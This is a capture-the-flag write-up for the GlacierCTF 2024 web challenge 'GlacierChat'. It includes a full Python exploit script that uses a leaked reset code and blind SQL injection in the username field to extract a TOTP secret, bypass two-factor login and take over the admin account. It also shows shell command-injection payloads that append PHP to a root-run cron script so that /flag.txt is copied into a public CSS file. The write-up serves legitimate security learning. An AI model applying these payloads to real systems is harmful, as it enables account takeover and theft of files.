
+++
date = '2024-11-24T17:59:18+01:00'
draft = false
title = 'GlacierCTF 2024 - GlacierChat'
author = 'TheMrEviil'
categories = ['writeups']
+++

# WEB: GlacierChat

## Description

```
We are happy to launch our new GlacierChat this year.
```

---

Hi! This challenge was quite difficult, but I managed to solve it. Here's a detailed write-up of how I did it.

---

## Step 1: Initial Exploration

After opening the website, I found a login form and a link to reset the password. While examining the code, I discovered an interesting parameter: `is_tenant`. If its value was set to `1`, a "debug" notification appeared, revealing the password reset code.

### Password Reset
Using this information, I accessed the `/set_new_password.php` endpoint, which allowed me to reset the password. 

**FIRST SUCCESS!**

---

## Step 2: Dual Authentication Verification

Upon further exploration, I discovered the application used a dual authentication mechanism. By reading the code, I identified that the application leveraged **OTPHP** for generating and validating one-time passwords (OTPs). To better understand how OTPHP worked, I ran the challenge locally with debug prints.

### Key Observation:
In the database, there was a field called `secret_totp`, which stored a token. This token was validated by the OTPHP library after being converted into numbers.

### What is OTPHP?

**OTPHP** is a PHP library that generates one-time passwords (OTPs) based on:
- **Time-based One-Time Password (TOTP)**.
- **HMAC-based One-Time Password (HOTP)**.

These algorithms are widely used for two-factor authentication (2FA). OTPHP simplifies the implementation of these algorithms in PHP applications.

*(Thanks to ChatGPT for the quick explanation!)*

### Footer Clue:
In the page footer, I noticed the current time displayed. This could be converted into a timestamp for use in generating OTPs. But how could I extract the `secret_totp`?

---

## Step 3: Finding the Vulnerability

After digging through the code for a few hours, I came across this snippet:

```php
$stmt = $db->prepare("SELECT password_cost FROM $users_table WHERE reset_code = :code AND username = '$username'");
$stmt->bindValue(":code", $code, SQLITE3_TEXT);
$stmt->bindValue(":username", $username, ...);
```

Here’s what I found:
1. The `$username` parameter was not validated properly.
2. The function always returned `"Successfully reset password"` regardless of whether the reset code was valid, due to the placement of the print statement.

I could confirm whether the reset succeeded by attempting to log in with the new password.

---

## Step 4: Exploiting the Vulnerability

Once I gathered all the necessary information, I crafted an exploit to reset the password and gain access. Upon success, I obtained a session cookie with credentials for the dashboard.

```python
import pwn 
import requests
import concurrent.futures
import time
import sys
import re
import pyotp
from datetime import datetime


headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

cookies = {
    "PHPSESSID": "2l22enmb5771kj2tojhaojqnhp"
}
key_ = ""
def send_otp_request(data, endpoint):
    global cookies
    response = requests.post(url_main + endpoint, headers=headers, cookies=cookies, data=data)

    if "Set-Cookie" in response.headers:
        new_session = extract_phpsessid(response.headers["Set-Cookie"])
        if new_session:
            cookies["PHPSESSID"] = new_session
            print(f"Zaktualizowano PHPSESSID: {new_session}")

    return response

def extract_phpsessid(set_cookie_header):
    match = re.search(r"PHPSESSID=([a-zA-Z0-9]+);", set_cookie_header)
    if match:
        return match.group(1)
    return None

def extract_reset_code(response_text):
    match = re.search(r"Reset code (\w+) uses custom prefix", response_text)
    if match:
        return match.group(1)
    return None

def first_step(payload, offset):
    data = {
        "form_name": "reset",
        "username": "admin",
        "is_tenant": "1"
    }
    response = send_otp_request(data, "/reset.php")
    code_reset = extract_reset_code(response.text)

    print(code_reset)
    ##############################################################################################################3
    # sys.exit()
    return new_password(code_reset, payload, offset)

def new_password(code_reset, payload, offset):
    data = {
        "form_name": "set_new_password",
        "code": code_reset,
        "username": f"admin' AND SUBSTRING(totp_secret, {offset}, 1) == '{payload}",
        "password": code_reset,
        "password_confirm": code_reset
    }
    print(f"admin' AND SUBSTRING(totp_secret, {offset}, 1) == '{payload}")
    response = send_otp_request(data, "/set_new_password.php")
    print(f"off: {offset} Payl: {payload}")
    
    if login_to(code_reset) == True:
        global key_
        print(payload)
        key_ += payload
        return True


def login_to(new_password):
    data = {
        "form_name": "login",
        "username": "admin",
        "password": new_password
    }
    response = send_otp_request(data, "/login.php")
    # print(response.text)
    if "Wrong credentials" in response.text:
       
        return False
    else:
        
        return True 

def convert_time(data): 
    date_string = data
    dt_object = datetime.strptime(date_string, "%a, %d %b %Y %H:%M:%S %z")
    return int(dt_object.timestamp())

def get_time_from_page():
    response = requests.get(url_main+"/login.php")
    pattern = r"[A-Za-z]{3}, \d{2} [A-Za-z]{3} \d{4} \d{2}:\d{2}:\d{2} \+\d{4}"

    matches = re.findall(pattern, response.text)
    return matches


url_main = "https://8cab891804e0738b14747428d79742fe.glacierchat.web.glacierctf.com"  # Adres URL

def two_auth(otp):
    data = {
        "form_name": "totp",
        "totp": otp
    }
    response = send_otp_request(data, '/totp.php')
    print(response.text)

for offsety in range(1,9):
    for payl in "ABCDEFGHIJKLMNPQRSTUVWXYZ234567":
        first_step(payl, offsety)
print(key_)

data_page = get_time_from_page()[0]
data_timestamp = convert_time(data_page)

totp = pyotp.TOTP(key_)
token = totp.at(data_timestamp)
print(token)
two_auth(token)
print(cookies["PHPSESSID"])

```
---

## Step 5: Command Injection Discovery

On the dashboard, I found a form to add jokes with an option to upload a media URL. I tested the input field with this payload:

```
;"ad;as'd;asd'as;d"
```

From the resulting error (Base64-encoded), I discovered the application was using shell commands, leading to a potential **command injection vulnerability**.

### Challenge:
The input field strictly validated URLs. Using `%20` (a space character in URLs) didn’t work in the shell.

After several hours of testing, I found a way to bypass the restrictions and copy the flag to the website directory without proper permissions.

---

## Step 6: Leveraging `cron.php`

While exploring further, I found a script called `cron.php`, which was triggered at intervals with **root permissions**. This gave me the perfect opportunity to inject malicious code.

### Payloads:

Here are the payloads I used to extract the flag:

```bash
ftp://example.com/;echo${IFS}"<?php">>/var/www/cron.php
ftp://example.com/;echo${IFS}'$lol1=file_get_contents("/flag.txt");'>>/var/www/cron.php
ftp://example.com/;echo${IFS}'file_put_contents("/var/www/html/assets/main.css",$lol1,FILE_APPEND);'>>/var/www/cron.php
```

---

## Step 7: Retrieving the Flag

After successfully injecting the payloads, I navigated to `main.css` in the application directory. The flag was stored there. 🎉

**Challenge Complete!**